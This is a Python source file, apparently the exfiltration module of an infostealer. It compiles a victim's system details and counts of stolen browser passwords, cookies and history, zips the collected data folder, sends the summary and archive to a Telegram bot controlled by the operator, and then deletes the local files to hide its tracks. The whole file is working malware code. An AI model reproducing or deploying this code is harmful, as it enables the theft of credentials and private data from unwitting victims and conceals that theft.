from os import remove, path
from shutil import make_archive, rmtree
from urllib.request import Request, urlopen
from urllib.parse import quote_plus

from ..utils.config import SenderConfig, pc_stats, browsers_stats, programs_stats
from ..utils import MultipartFormDataEncoder


class Sender:

    def __init__(self, *args):

        self.config = SenderConfig()

        for index, variable in enumerate(self.config.Variables):
            self.__dict__.update({variable: args[index]})

    def __send_message(self):
        text = f"Username: {pc_stats['name']}\n"
        text += f"---⚙️**System**---\n"
        text += f"IP: `{pc_stats['ip']}`\n"
        text += f"OS name: `{pc_stats['os_name']}`\n"
        text += f"OS version: `{pc_stats['os_version']}`\n"
        text += f"CPU: `{pc_stats['cpu']}`\n"
        text += f"GPU: `{pc_stats['gpu']}`\n"
        text += f"RAM: `{pc_stats['ram']} gb`\n\n"

        if browsers_stats['browsers']:
            text += f"---🔎**Browsers**---\n"
            text += f"🔑Passwords: `{browsers_stats['passwords']}`\n" if browsers_stats['passwords'] > 0 else ''
            text += f"🍪Cookies: `{browsers_stats['cookies']}`\n" if browsers_stats['cookies'] > 0 else ''
            text += f"⌛️History: `{browsers_stats['history']}`\n" if browsers_stats['history'] > 0 else ''
            text += f"Browsers: {', '.join(browsers_stats['browsers'])}\n\n"

        if any([item[1] for item in programs_stats.items()]):
            text += f"---🕹**Programs**---\n"
            for item in programs_stats.items():
                if item[1]:
                    text += f"{item[0]}\n"
            text += "\n"

        msg = quote_plus(text)
        urlopen(f"https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.user_id}&parse_mode=Markdown&text={msg}")

    def __create_archive(self):

        make_archive(rf"{path.dirname(self.storage_path)}\{self.zip_name}", "zip", self.storage_path)

    def __send_archive(self):

        with open(rf"{path.dirname(self.storage_path)}\{self.zip_name}.zip", "rb") as file:

            content_type, body = MultipartFormDataEncoder().encode(
                [("chat_id", self.user_id)],
                [("document", f"{self.zip_name}.zip", file)]
            )

            query = Request(
                method="POST",
                url=f"https://api.telegram.org/bot{self.token}/sendDocument",
                data=body
            )

            query.add_header("User-Agent", self.config.UserAgent)
            query.add_header("Content-Type", content_type)

            urlopen(query)

        file.close()

    def __delete_files(self):

        rmtree(self.storage_path)
        remove(rf"{path.dirname(self.storage_path)}\{self.zip_name}.zip")

    def run(self):

        try:

            self.__create_archive()
            self.__send_message()
            self.__send_archive()
            self.__delete_files()

        except Exception as e:
            if self.errors is True: print(f"[Sender]: {repr(e)}")
